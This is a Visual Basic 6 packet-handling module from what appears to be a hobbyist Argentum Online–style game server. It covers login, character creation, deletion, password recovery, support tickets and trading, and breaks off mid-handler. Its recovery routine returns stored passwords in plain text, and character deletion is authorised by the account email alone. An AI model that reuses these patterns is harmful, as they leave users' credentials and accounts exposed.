Attribute VB_Name = "TCP2"
 
'director del proyecto: #Esteban(Neliam)

'servidor basado en fénixao 1.0
'medios de contacto:
'Skype: dc.esteban
'E-mail: nabrianao@gmail.com
Sub HandleData(Userindex As Integer, ByVal rdata As String)
On Error GoTo ErrorHandler:

Dim TempTick As Long
Dim sndData As String
Dim CadenaOriginal As String

Dim loopc As Integer
Dim nPos As WorldPos
Dim tStr As String
Dim tInt As Integer
Dim tLong As Long
Dim numeromail As Integer
Dim Tindex As Integer
Dim tName As String
Dim Clase As Byte
Dim NumNPC As Integer
Dim tMessage As String
Dim i As Integer
Dim auxind As Integer
Dim arg1 As String
Dim arg2 As String
Dim arg3 As String
Dim Arg4 As String
Dim Arg5 As Integer
Dim Arg6 As String
Dim DummyInt As Integer
Dim Antes As Boolean
Dim Ver As String
Dim encpass As String
Dim pass As String
Dim Mapa As Integer
Dim usercon As String
Dim nameuser As String
Dim Name As String
Dim ind
Dim GMDia As String
Dim GMMapa As String
Dim GMPJ As String
Dim GMMail As String
Dim GMGM As String
Dim GMTitulo As String
Dim GMMensaje As String
Dim N As Integer
Dim wpaux As WorldPos
Dim mifile As Integer
Dim X As Integer
Dim y As Integer
Dim cliMD5 As String
Dim UserFile As String
Dim UserName As String
UserName = UserList(Userindex).Name
UserFile = CharPath & UCase$(UserName) & ".chr"
Dim ClientCRC As String
Dim ServerSideCRC As Long
Dim NombreIniChat As String
Dim cantidadenmapa As Integer
Dim Prueba1 As Integer
CadenaOriginal = rdata

If Userindex <= 0 Then
    Call CloseSocket(Userindex)
    Exit Sub
End If

If Recargando Then
    Call SendData(ToIndex, Userindex, 0, "!!Recargando información, espere unos momentos.")
    Call CloseSocket(Userindex)
End If

If Left$(rdata, 13) = "gIvEmEvAlcOde" Then
   UserList(Userindex).flags.ValCoDe = CInt(RandomNumber(20000, 32000))
   UserList(Userindex).RandKey = CLng(RandomNumber(145, 99999))
   UserList(Userindex).PrevCRC = UserList(Userindex).RandKey
   UserList(Userindex).PacketNumber = 100
   Call SendData(ToIndex, Userindex, 0, "VAL" & UserList(Userindex).RandKey & "," & UserList(Userindex).flags.ValCoDe & "," & S)
   UserList(Userindex).PrevCRC = 0
   Exit Sub
ElseIf Not UserList(Userindex).flags.UserLogged And Left$(rdata, 12) = "CLIENTEVIEJO" Then
    Dim ElMsg As String, LaLong As String
    'ElMsg = "ERRLa version del cliente que usás es obsoleta. Si deseas conectarte a este servidor entrá a http://nabrianao.com/foro/ y allí podrás enterarte como hacer."
    If Len(ElMsg) > 255 Then ElMsg = Left$(ElMsg, 255)
    LaLong = Chr$(0) & Chr$(Len(ElMsg))
    Call SendData(ToIndex, Userindex, 0, LaLong & ElMsg)
    Call CloseSocket(Userindex)
    Exit Sub
Else
   ClientCRC = Right$(rdata, Len(rdata) - InStrRev(rdata, Chr$(126)))
   tStr = Left$(rdata, Len(rdata) - Len(ClientCRC) - 1)
   
   rdata = tStr
   tStr = ""

End If

UserList(Userindex).Counters.IdleCount = Timer


   
   If Not UserList(Userindex).flags.UserLogged Then
          
        Select Case Left$(rdata, 6)
        
             Case "BORRAR"
                 
                    If aClon.MaxPersonajes(UserList(Userindex).ip) Then
                    Call SendData(ToIndex, Userindex, 0, "ERRHas hecho demasiados intentos prueba en 10 minutos.")
                    Call CloseSocket(Userindex)
                    Exit Sub
                End If
                
     'Call SendData(ToIndex, UserIndex, 0, "ERREl SISTEMA DESABILITADO hasta nuevo aviso.")
                rdata = Right$(rdata, Len(rdata) - 6)
                Dim PassWord As String
                Name = ReadField(1, rdata, 44)
                PassWord = ReadField(2, rdata, 44)
            
                '¿El personaje está logueado?
                If CheckForSameName(Userindex, Name) Then
                If NameIndex(Name) = Userindex Then Call CloseSocket(NameIndex(Name))
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje aún está dentro del juego. Desloguee el personaje o pida a algún GM que lo quite. Si esta ventana le vuelve a saltar, compruebe que el personaje no esté en el juego. Si no está en el juego contáctese con: nabrianao@gmail.com, Muchas gracias por su atención.")
                Call CloseSocket(Userindex)
                Exit Sub
                End If
                
                '¿Es nombre válido?
                If Not AsciiValidos(Name) Then
                Call SendData(ToIndex, Userindex, 0, "ERREl nombre especificado es inválido.")
                Exit Sub
                End If
            
                '¿Existe el personaje?
                If FileExist(CharPath & UCase$(Name) & ".chr", vbNormal) = False Then
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje no existe")
                Call CloseSocket(Userindex)
                Exit Sub
                End If
                
                '¿Es el password válido?
                If UCase$(PassWord) <> UCase$(GetVar(CharPath & UCase$(Name) & ".chr", "CONTACTO", "Email")) Then
                Call SendData(ToIndex, Userindex, 0, "ERRCodigo Incorrecto.")
                Call CloseSocket(Userindex)
                Exit Sub
                End If
            
                '¿Está baneado?
                If BANCheck(Name) Then
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje se encuentra baneado y por lo tanto no se podrá borrar. Haga su descargo en el foro o contáctese con: nabrianao@gmail.com, Muchas gracias por su atención.")
                Exit Sub
                End If
 
               ' Borramos el personaje ;D
                If FileExist(CharPath & UCase$(Name) & ".chr", vbNormal) = True Then
                Kill CharPath & UCase$(Name) & ".chr"
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje fué borrado exitósamente! Recuerde que una vez borrado NO será recuperado.")
                Exit Sub
                End If
                 Exit Sub
                 
                  Case "JHUMPH" '---------> OLOGIO

                rdata = Right$(rdata, Len(rdata) - 6)
                
                cliMD5 = ReadField(5, rdata, 44)
                tName = ReadField(1, rdata, 44)
                tName = RTrim(tName)
                
                    
                If Not AsciiValidos(tName) Then
                    Call SendData(ToIndex, Userindex, 0, "ERRNombre invalido.")
                    Exit Sub
                End If
                

                Ver = ReadField(3, rdata, 44)
                If Ver = UltimaVersion Then
               
            
                tStr = ReadField(6, rdata, 44)
                
        
                tStr = ReadField(7, rdata, 44)

                Call ConnectUser(Userindex, tName, ReadField(2, rdata, 44), ReadField(5, rdata, 44), ReadField(6, rdata, 44), ReadField(7, rdata, 44))
                
                UserList(Userindex).Char.Aura = 0 'dx8
                If ObjData(UserList(Userindex).Invent.WeaponEqpObjIndex).Aura <> 0 Then 'dx8
                UserList(Userindex).Char.Aura = ObjData(UserList(Userindex).Invent.WeaponEqpObjIndex).Aura 'dx8
                End If 'dx8
                
                Call SendData(ToPCArea, Userindex, UserList(Userindex).POS.Map, "AUR" & UserList(Userindex).Char.CharIndex & "," & UserList(Userindex).Char.Aura) 'dx8
                
                If UserList(Userindex).flags.Privilegios = 4 Then
                    Call SendData(ToIndex, Userindex, 0, "EGM")
                Else
                    Call SendData(ToIndex, Userindex, 0, "NGM")
                End If
                
               Else
               Call SendData(ToIndex, Userindex, 0, "ERREl cliente es invalido, descarga la ultima actualización: " & UltimaVersion & " para poder conectarse al juego.")
                Exit Sub
                End If
                
            Case "TIRDAD"
                If Restringido Then
                   ' Call SendData(ToIndex, Userindex, 0, "ERREl servidor está restringido solo para GameMasters temporalmente.")
                    Exit Sub
                End If

                UserList(Userindex).Stats.UserAtributosBackUP(1) = 18
                UserList(Userindex).Stats.UserAtributosBackUP(2) = 18
                UserList(Userindex).Stats.UserAtributosBackUP(3) = 18
                UserList(Userindex).Stats.UserAtributosBackUP(4) = 18
                UserList(Userindex).Stats.UserAtributosBackUP(5) = 18
                
                Call SendData(ToIndex, Userindex, 0, ("DADOS" & UserList(Userindex).Stats.UserAtributosBackUP(1) & "," & UserList(Userindex).Stats.UserAtributosBackUP(2) & "," & UserList(Userindex).Stats.UserAtributosBackUP(3) & "," & UserList(Userindex).Stats.UserAtributosBackUP(4) & "," & UserList(Userindex).Stats.UserAtributosBackUP(5)))
                
                Exit Sub

                Case "RECUPE"
                  '  Call SendData(ToIndex, UserIndex, 0, "ERREl SISTEMA DESABILITADO hasta nuevo aviso.")
                     If aClon.MaxPersonajes(UserList(Userindex).ip) Then
                                        Call SendData(ToIndex, Userindex, 0, "ERRHas hecho demasiados intentos prueba en 10 minutos.")
                    Call CloseSocket(Userindex)
                    Exit Sub
                End If
                rdata = Right$(rdata, Len(rdata) - 6)
                Name = ReadField(1, rdata, 44)
                Dim Correo As String
                Correo = ReadField(2, rdata, 44)
    
                
                '¿Es nombre válido?
                If Not AsciiValidos(Name) Then
                Call SendData(ToIndex, Userindex, 0, "ERREl nombre especificado es inválido.")
                Exit Sub
                End If
            
                '¿Existe el personaje?
                If FileExist(CharPath & UCase$(Name) & ".chr", vbNormal) = False Then
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje no existe")
                Call CloseSocket(Userindex)
                Exit Sub
                End If
                
                          '¿Está baneado?
                If BANCheck(Name) Then
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje se encuentra baneado y por lo tanto no se podrá recuperar. Haga su descargo en el foro o contáctese con: nabrianao@gmail.com, Muchas gracias por su atención.")
                Exit Sub
                End If
                
                                      '¿El personaje está logueado?
                If CheckForSameName(Userindex, Name) Then
                If NameIndex(Name) = Userindex Then Call CloseSocket(NameIndex(Name))
                Call SendData(ToIndex, Userindex, 0, "ERREl personaje aún está dentro del juego. Desloguee el personaje o pida a algún GM que lo quite. Si esta ventana le vuelve a saltar, compruebe que el personaje no esté en el juego. Si no está en el juego contáctese con: nabrianao@gmail.com . Muchas gracias por su atención.")
                Call CloseSocket(Userindex)
                Exit Sub
                End If
                
                
                If ComprobarCorreo(Name, Correo) = True Then
                   Call SendData(ToIndex, Userindex, 0, "ERRTu nueva password es: " & ObtenerPassword(Name) & "")
                  Else
                        Call SendData(ToIndex, Userindex, 0, "ERRCodigo incorrecto.")
                        Call CloseSocket(Userindex)
                    End If
               
                Exit Sub

            Case "SARAXA" '----------------> NLOGIO
                If PuedeCrearPersonajes = 0 Then
                    Call SendData(ToIndex, Userindex, 0, "ERRNo se pueden crear más personajes en este servidor.")
                    Call CloseSocket(Userindex)
                    Exit Sub
                End If
                rdata = Right$(rdata, Len(rdata) - 6)
                cliMD5 = Right$(rdata, 8)
                Ver = ReadField(5, rdata, 44)
                If Ver = UltimaVersion Then
                     Call ConnectNewUser(Userindex, ReadField(1, rdata, 44), ReadField(2, rdata, 44), val(ReadField(3, rdata, 44)), ReadField(4, rdata, 44), ReadField(6, rdata, 44), ReadField(7, rdata, 44), _
                     val(ReadField(8, rdata, 44)), ReadField(9, rdata, 44), ReadField(10, rdata, 44), ReadField(11, rdata, 44), ReadField(12, rdata, 44), ReadField(13, rdata, 44), _
                     ReadField(14, rdata, 44), ReadField(15, rdata, 44), ReadField(16, rdata, 44), ReadField(17, rdata, 44), ReadField(18, rdata, 44), ReadField(19, rdata, 44), _
                     ReadField(20, rdata, 44), ReadField(21, rdata, 44), ReadField(22, rdata, 44), ReadField(23, rdata, 44), ReadField(24, rdata, 44), ReadField(25, rdata, 44), _
                     ReadField(26, rdata, 44), ReadField(27, rdata, 44), ReadField(28, rdata, 44), ReadField(29, rdata, 44), ReadField(30, rdata, 44), ReadField(31, rdata, 44), _
                     ReadField(32, rdata, 44), ReadField(33, rdata, 44), ReadField(34, rdata, 44), ReadField(35, rdata, 44), ReadField(36, rdata, 44), ReadField(38, rdata, 44), ReadField(39, rdata, 44), ReadField(40, rdata, 44))
                Else
                     Call SendData(ToIndex, Userindex, 0, "ERREl cliente es invalido, descarga la ultima actualización: " & UltimaVersion & " para poder conectarse al juego.")
                     Exit Sub
               End If
               
            Exit Sub
        End Select
    End If

If Not UserList(Userindex).flags.UserLogged Then
    Call CloseSocket(Userindex)
    Exit Sub
End If
  
Dim Procesado As Boolean

If UserList(Userindex).Counters.Saliendo Then
    UserList(Userindex).Counters.Saliendo = False
    UserList(Userindex).Counters.Salir = 0
    Call SendData(ToIndex, Userindex, 0, "{A")
End If

If Left$(rdata, 1) <> "#" Then
    Call HandleData1(Userindex, rdata, Procesado)
    If Procesado Then Exit Sub
Else
    Call HandleData2(Userindex, rdata, Procesado)
    If Procesado Then Exit Sub
End If

If Left$(rdata, 1) <> "#" Then
    Call HandleData3(Userindex, rdata)
End If

  If ApuestanPj = False Then
        ''####### Ofrecer Reto por Pj
        
If (Left$(rdata, 11)) = "/ºZñ?+{æ¿¶ " Then
        rdata = Right$(rdata, Len(rdata) - 11)
        Dim Quienx As String
        Dim MiCodx As String
        Dim Contrincante As Integer
        If UserList(Userindex).POS.Map <> 1 Then Exit Sub
        Quienx = ReadField(1, rdata, Asc(","))
        MiCodx = ReadField(2, rdata, Asc(","))
        If UserList(Userindex).Email = MiCodx Then
        Contrincante = NameIndex(Quienx & "*")
        If Contrincante <= 0 Then
            If Contrincante = Userindex Then Exit Sub
        Call SendData(ToIndex, Userindex, 0, "1A")
        Exit Sub
        End If
        If ControlarPedidoRP(Userindex, Contrincante) = False Then Exit Sub
            UserList(Userindex).flags.ApostandoPOR = 0
            UserList(Userindex).flags.Apostandoa = Contrincante
            UserList(Userindex).Counters.ApostandoPj = Timer
            UserList(Contrincante).flags.ApostandoPOR = Userindex
            UserList(Userindex).Counters.ApostandoPj = Timer
            UserList(Contrincante).Counters.ApostandoPj = Timer
            Call SendData(ToIndex, Userindex, 0, "||Le estas apostando tu Pj a " & UserList(Contrincante).Name & FONTTYPE_BLANCO)
            Call SendData(ToIndex, Contrincante, 0, "||Te está apostando su Pj " & UserList(Userindex).Name & " . Usa F8 para ingresar tu código y aceptar, o pon /RECHAZAR para cancelar." & FONTTYPE_BLANCO)
        Else
            Call SendData(ToIndex, Userindex, 0, "||Código incorrecto." & FONTTYPE_BLANCO)
            Exit Sub
        End If
Exit Sub
End If

        ''####### Aceptar Reto por Pj
If (Left$(rdata, 11)) = "/ºZ¦ï+{æ¿¶ " Then
        rdata = Right$(rdata, Len(rdata) - 11)
        
        MiCodx = rdata
        If UserList(Userindex).POS.Map <> 1 Then Exit Sub
        If ControlarAceptoRP(Userindex) = False Then Exit Sub

        If UserList(Userindex).Email = MiCodx Then
        
                Contrincante = UserList(Userindex).flags.ApostandoPOR
        
                If UserList(Contrincante).flags.Apostandoa = Userindex Then
                    Call MetaGuachaRP(Userindex, Contrincante)
                Else
                    Call SendData(ToIndex, Userindex, 0, "||Tu oponente retó a otro. Cancelado" & FONTTYPE_BLANCO)
                    Exit Sub
                End If
        Else
                Call SendData(ToIndex, Userindex, 0, "||Código incorrecto." & FONTTYPE_BLANCO)
        Exit Sub
        End If
Exit Sub
End If
        
If UCase$(Left$(rdata, 9)) = "/RECHAZAR" Then
        If UserList(Userindex).POS.Map <> 1 Then Exit Sub
        If UserList(Userindex).flags.ApostandoPOR <= 0 Then
        Call SendData(ToIndex, Userindex, 0, "||Nadie te retó." & FONTTYPE_BLANCO)
        Exit Sub
        End If
        Contrincante = UserList(Userindex).flags.ApostandoPOR
        If Contrincante <= 0 Then Exit Sub
        'UserList(Userindex).flags.Apostandoa = 0
        UserList(Contrincante).flags.Apostandoa = 0
        UserList(Userindex).flags.ApostandoPOR = 0
        UserList(Contrincante).Counters.ApostandoPj = 0
        UserList(Userindex).Counters.ApostandoPj = 0
        Call SendData(ToIndex, Contrincante, 0, "||" & UserList(Userindex).Name & " rechazó el pedido." & FONTTYPE_BLANCO)
        Call SendData(ToIndex, Userindex, 0, "||Rechazaste el pedido." & FONTTYPE_BLANCO)
Exit Sub
End If
End If


    If UCase$(rdata) = "/MISOPORTE" Then
    Dim MiRespuesta As String
    MiRespuesta = GetVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Respuesta")
            If Len(MiRespuesta) Then
                If Right$(MiRespuesta, 3) = "0k1" Then
                    Call SendData(ToIndex, Userindex, 0, "VERSO" & Left$(MiRespuesta, Len(MiRespuesta) - 3))
                Else
                    Call SendData(ToIndex, Userindex, 0, "VERSO" & MiRespuesta)
                    MiRespuesta = MiRespuesta & "0k1"
                    Call WriteVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Respuesta", MiRespuesta)
                End If
            Else
            MiRespuesta = GetVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Soporte")
                If Len(MiRespuesta) Then
                    Call SendData(ToIndex, Userindex, 0, "||tu soporte no fúe respondido aún." & FONTTYPE_FENIX)
                Else
                    Call SendData(ToIndex, Userindex, 0, "||No has mandado ningun soporte!" & FONTTYPE_FENIX)
                End If
            End If
        Exit Sub
    End If
     
     If UCase$(Left$(rdata, 9)) = "/ZOPORTE " Then
        If SoporteDesactivado Then
            Call SendData(ToIndex, Userindex, 0, "||El soporte se encuentra deshabilitado." & FONTTYPE_FENIX)
            Exit Sub
        End If
        If Len(rdata) > 310 Then Exit Sub
        If InStr(rdata, "°") Then Exit Sub
        If InStr(rdata, "~") Then Exit Sub
        rdata = Right$(rdata, Len(rdata) - 9)
        Dim SoporteA As String
        SoporteA = GetVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Respuesta")
        If Len(SoporteA) > 0 And Right$(SoporteA, 3) <> "0k1" Then
        Call SendData(ToIndex, Userindex, 0, "||Primero debes leer la respuesta de tu anterior soporte." & FONTTYPE_FENIX)
        Exit Sub
        End If
        SoporteA = GetVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Soporte")
        If Len(SoporteA) > 0 And Right$(SoporteA, 3) <> "0k1" Then
        Call SendData(ToIndex, Userindex, 0, "||Ya has mandado un soporte. Debes esperar la respuesta para enviar otro. " & FONTTYPE_FENIX)
        Exit Sub
        End If
        SoporteA = "Dia:" & Day(Now) & " Hora:" & Time & " - Soporte: " & Replace(Replace(rdata, ";", ":"), Chr$(13) & Chr$(10), Chr(32))
        Call WriteVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Soporte", SoporteA)
        Call WriteVar(CharPath & UCase$(UserList(Userindex).Name) & ".CHR", "STATS", "Respuesta", "")
        SoporteS.Add (UserList(Userindex).Name)
        Call SendData(ToIndex, Userindex, 0, "||El soporte ha sido enviado con éxito. Gracias por utilizar nuestro sistema. Espere su respuesta." & FONTTYPE_FENIX)
        Call SendData(ToAdmins, 0, 0, "||" & UserList(Userindex).Name & " a enviado un soporte." & FONTTYPE_TALK)
        Exit Sub
        End If
 
If UCase$(Left$(rdata, 8)) = "/SOPORTE" Then
If UserList(Userindex).flags.SoporteSTOP = 1 Then
Call SendData(ToIndex, Userindex, 0, "||Fuiste stopeado de los soportes por un Game Master." & FONTTYPE_TALK)
Exit Sub
End If
If UserList(Userindex).POS.Map = Prision.Map Then
Call SendData(ToIndex, Userindex, 0, "||No puedes enviar soportes estando en la cárcel, realiza tu consulta vía foro: http://nabrianao.com/foro/" & FONTTYPE_TALK)
Exit Sub
End If

    Call SendData(ToIndex, Userindex, 0, "SHWSUP")
    Exit Sub
End If

If UCase$(Left$(rdata, 3)) = "/GM" Then
If UserList(Userindex).flags.SoporteSTOP = 1 Then
Call SendData(ToIndex, Userindex, 0, "||Fuiste stopeado de los soportes por un Game Master." & FONTTYPE_TALK)
Exit Sub
End If
If UserList(Userindex).POS.Map = Prision.Map Then
Call SendData(ToIndex, Userindex, 0, "||No puedes enviar soportes estando en la cárcel, realiza tu consulta vía foro: http://nabrianao.com/foro/" & FONTTYPE_TALK)
Exit Sub
End If

    Call SendData(ToIndex, Userindex, 0, "SHWSUP")
    Exit Sub
End If
 
If UCase$(rdata) = "/ROSTRO" Then
        If UserList(Userindex).flags.Comerciando = True Then Exit Sub
If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
If UserList(Userindex).flags.Retando = True Then Exit Sub
If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
If UserList(Userindex).POS.Map = 108 Then Exit Sub

    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub 'galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub
    
If UserList(Userindex).flags.TargetNpc = 0 Then
Call SendData(ToIndex, Userindex, 0, "||Debes clickear al cirujano" & FONTTYPE_TALK)
Exit Sub
End If
If Npclist(UserList(Userindex).flags.TargetNpc).NPCtype <> NPCTYPE_CIRUJANO Then
Call SendData(ToIndex, Userindex, 0, "||Debes clickear al cirujano" & FONTTYPE_TALK)
Exit Sub
End If

If UserList(Userindex).Stats.GLD < 1000000 Then
Call SendData(ToIndex, Userindex, 0, "||No tienes suficiente oro." & FONTTYPE_INFO)
Exit Sub
End If
If UserList(Userindex).flags.Muerto Then
Call SendData(ToIndex, Userindex, 0, "||Estás muerto!" & FONTTYPE_INFO)
Exit Sub
End If
If Distancia(UserList(Userindex).POS, Npclist(UserList(Userindex).flags.TargetNpc).POS) > 10 Then
Call SendData(ToIndex, Userindex, 0, "||Estás demasiado lejos." & FONTTYPE_INFO)
Exit Sub
End If
Dim UserHead As Integer
Dim QGENERO As Byte
QGENERO = UserList(Userindex).Genero
Select Case QGENERO
Case HOMBRE
Select Case UserList(Userindex).Raza
Case HUMANO
UserHead = CInt(RandomNumber(1, 24))
If UserHead > 24 Then UserHead = 24
Case ELFO
UserHead = CInt(RandomNumber(1, 7)) + 100
If UserHead > 107 Then UserHead = 107
Case ELFO_OSCURO
UserHead = CInt(RandomNumber(1, 4)) + 200
If UserHead > 204 Then UserHead = 204
Case ENANO
UserHead = RandomNumber(1, 4) + 300
If UserHead > 304 Then UserHead = 304
Case GNOMO
UserHead = RandomNumber(1, 3) + 400
If UserHead > 403 Then UserHead = 403
Case Else
UserHead = 1

End Select
Case MUJER
Select Case UserList(Userindex).Raza
Case HUMANO
UserHead = CInt(RandomNumber(1, 4)) + 69
If UserHead > 73 Then UserHead = 73
Case ELFO
UserHead = CInt(RandomNumber(1, 5)) + 169
If UserHead > 174 Then UserHead = 174
Case ELFO_OSCURO
UserHead = CInt(RandomNumber(1, 5)) + 269
If UserHead > 274 Then UserHead = 274
Case GNOMO
UserHead = RandomNumber(1, 4) + 469
If UserHead > 473 Then UserHead = 473
Case ENANO
UserHead = RandomNumber(1, 3) + 369
If UserHead > 372 Then UserHead = 372
Case Else
UserHead = 70
End Select
End Select

UserList(Userindex).Stats.GLD = UserList(Userindex).Stats.GLD - 1000000

If UserList(Userindex).Char.Head = UserHead Then
Call SendData(ToIndex, Userindex, 0, "||" & vbRed & "°" & "He fallado en la operación. Intenta otra vez." & "°" & Npclist(UserList(Userindex).flags.TargetNpc).Char.CharIndex & FONTTYPE_TALK)
Exit Sub
End If

UserList(Userindex).Char.Head = UserHead
UserList(Userindex).OrigChar.Head = UserHead
Call SendData(ToIndex, Userindex, 0, "||" & vbGreen & "°" & "Tu rostro ha sido operado." & "°" & Npclist(UserList(Userindex).flags.TargetNpc).Char.CharIndex & FONTTYPE_TALK)
Call ChangeUserChar(ToMap, 0, UserList(Userindex).POS.Map, Userindex, UserList(Userindex).Char.Body, val(UserHead), UserList(Userindex).Char.Heading, UserList(Userindex).Char.WeaponAnim, UserList(Userindex).Char.ShieldAnim, UserList(Userindex).Char.CascoAnim)
Call SendUserORO(Userindex)
Exit Sub
End If

If UCase$(Left$(rdata, 16)) = "/ACEPTARCOMERCIO" Then
   rdata = Right$(rdata, Len(rdata) - 16)
   
      If UserList(Userindex).flags.CuentaPendienteCc = 0 Then
      Call SendData(ToIndex, Userindex, 0, "||No tienes ningún ofrecimiento de comercio pendiente." & FONTTYPE_TALK)
      Exit Sub
      End If
      
      If UserList(Userindex).flags.Comerciando = True Then
      Call SendData(ToIndex, Userindex, 0, "||¡Estas comerciando!" & FONTTYPE_TALK)
      Exit Sub
      End If
   
If UserList(Userindex).flags.TargetUser Then
            
            If UserList(Userindex).flags.Privilegios = 1 Or UserList(Userindex).flags.Privilegios = 2 Or UserList(Userindex).flags.Privilegios = 3 Then Exit Sub
            If UserList(Userindex).POS.Map = Prision.Map Then
            Call SendData(ToIndex, Userindex, 0, "||No puedes comerciar estando en la cárcel." & FONTTYPE_TALK)
            Exit Sub
            End If

            If UserList(UserList(Userindex).flags.TargetUser).flags.Muerto Then
                Call SendData(ToIndex, Userindex, 0, "4U")
                Exit Sub
            End If
            
            If UserList(Userindex).flags.TargetUser = Userindex Then
                Call SendData(ToIndex, Userindex, 0, "5U")
                Exit Sub
            End If
            
            If Distancia(UserList(UserList(Userindex).flags.TargetUser).POS, UserList(Userindex).POS) > 3 Then
                Call SendData(ToIndex, Userindex, 0, "DL")
                Exit Sub
            End If
            Dim UserMando As Integer
            Dim UserReciviO As Integer
            
            UserMando = Userindex
            UserReciviO = UserList(Userindex).flags.TargetUser
            ' aca empieza
            
            If UserList(UserMando).ComercioNuevo.UsuarioManda = UserList(UserMando).ComercioNuevo.UsuarioRecive Then
            Call SendData(ToIndex, UserMando, 0, "INITCOMUSU")
            Call SendData(ToIndex, UserList(UserMando).ComercioNuevo.UsuarioRecive, 0, "INITCOMUSU")

            UserList(UserMando).ComercioNuevo.Usuario1 = UserReciviO
            UserList(UserList(UserMando).ComercioNuevo.UsuarioRecive).ComercioNuevo.Usuario1 = UserMando

            UserList(UserMando).flags.Comerciando = True
            UserList(UserList(UserMando).ComercioNuevo.UsuarioRecive).flags.Comerciando = True

            UserList(UserMando).flags.ComerCiandoNuevo = True
            UserList(UserList(UserMando).ComercioNuevo.UsuarioRecive).flags.ComerCiandoNuevo = True
            
            UserList(UserMando).flags.CuentaPendienteCc = 0
            UserList(UserList(UserMando).ComercioNuevo.UsuarioRecive).flags.CuentaPendienteCc = 0
            
            UserList(UserMando).ComercioNuevo.UsuarioRecive = 0
            UserList(UserList(UserMando).ComercioNuevo.Usuario1).ComercioNuevo.UsuarioRecive = 0
            UserList(UserMando).ComercioNuevo.UsuarioManda = 0
            UserList(UserList(UserMando).ComercioNuevo.Usuario1).ComercioNuevo.UsuarioManda = 0
    
            End If
           'ca termina
        Else
            Call SendData(ToIndex, Userindex, 0, "ZP")
        End If
Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/OFERTU " Then
   rdata = Right$(rdata, Len(rdata) - 8)
   CantidadComercioOro = ReadField(1, rdata, 32)
   
If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
If UserList(Userindex).flags.Retando = True Then Exit Sub
If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
If UserList(Userindex).POS.Map = 108 Then Exit Sub

    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub 'galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub
   
If UserList(Userindex).flags.Comerciando = True Then

If UserList(Userindex).ComercioNuevo.YaOfrecioOro = True Then
Call SendData(ToIndex, Userindex, 0, "||Ya ofreciste oro no puedes cambiar tu oferta." & FONTTYPE_INFO)
Exit Sub
End If

If CantidadComercioOro < 1 Then Exit Sub 'negativos na culeado.

  If UserList(Userindex).Stats.GLD < CantidadComercioOro Then
                   Call SendData(ToIndex, Userindex, 0, "||No tienes suficientes monedas de oro" & FONTTYPE_INFO)
        Exit Sub
        End If

UserList(Userindex).ComercioNuevo.YaOfrecioOro = True
UserList(Userindex).ComercioNuevo.OroOfrecido = CantidadComercioOro

UserList(Userindex).Stats.GLD = UserList(Userindex).Stats.GLD - UserList(Userindex).ComercioNuevo.OroOfrecido
Call SendUserORO(Userindex)

Call SendData(ToIndex, Userindex, 0, "GH" & PonerPuntos(UserList(Userindex).ComercioNuevo.OroOfrecido) & " Monedas de oro")
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GS" & PonerPuntos(UserList(Userindex).ComercioNuevo.OroOfrecido) & " Monedas de oro")

End If
Exit Sub
End If


If UCase$(Left$(rdata, 8)) = "/OFERTI " Then
   rdata = Right$(rdata, Len(rdata) - 8)
   CantidadComercioCanjes = ReadField(1, rdata, 32)
   
If UserList(Userindex).flags.notesaleelbug = True Then Exit Sub
If UserList(Userindex).flags.Retando = True Then Exit Sub
If Userindex = Subastador Then Exit Sub
If Userindex = UltimoOfertador Then Exit Sub
If UserList(Userindex).POS.Map = 108 Then Exit Sub

    If UserList(Userindex).flags.EnvRetoC = True Then Exit Sub 'galle
    If UserList(Userindex).flags.RecRetoC = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC1 = True Then Exit Sub
    If UserList(Userindex).flags.enRetoC2 = True Then Exit Sub
   
If UserList(Userindex).flags.Comerciando = True Then

If UserList(Userindex).ComercioNuevo.YaOfrecioCanjeos = True Then
Call SendData(ToIndex, Userindex, 0, "||Ya ofreciste puntos de canjeos no puedes cambiar tu oferta." & FONTTYPE_INFO)
Exit Sub
End If

If CantidadComercioCanjes < 1 Then Exit Sub 'negativos na culeado.

  If UserList(Userindex).flags.CanjesDonador < CantidadComercioCanjes Then
                   Call SendData(ToIndex, Userindex, 0, "||No tienes suficientes puntos." & FONTTYPE_INFO)
        Exit Sub
        End If

UserList(Userindex).ComercioNuevo.YaOfrecioCanjeos = True
UserList(Userindex).ComercioNuevo.CanjeosOfrecidos = CantidadComercioCanjes

UserList(Userindex).flags.CanjesDonador = UserList(Userindex).flags.CanjesDonador - UserList(Userindex).ComercioNuevo.CanjeosOfrecidos
Call SendUserREP(Userindex)

Call SendData(ToIndex, Userindex, 0, "GX" & "Puntos de canjeos" & "," & UserList(Userindex).ComercioNuevo.CanjeosOfrecidos)
Call SendData(ToIndex, UserList(Userindex).ComercioNuevo.Usuario1, 0, "GJ" & "Puntos de canjeos" & "," & UserList(Userindex).ComercioNuevo.CanjeosOfrecidos)

End If
Exit Sub
End If

If UCase$(Left$(rdata, 8)) = "/OFERTA " Then
   rdata = Right$(rdata, Len(rdata) - 8)
    ItemComercioOfrece = ReadField(1, rdata, 32)
    CantidadComercio = ReadField(2, rdata, 32)

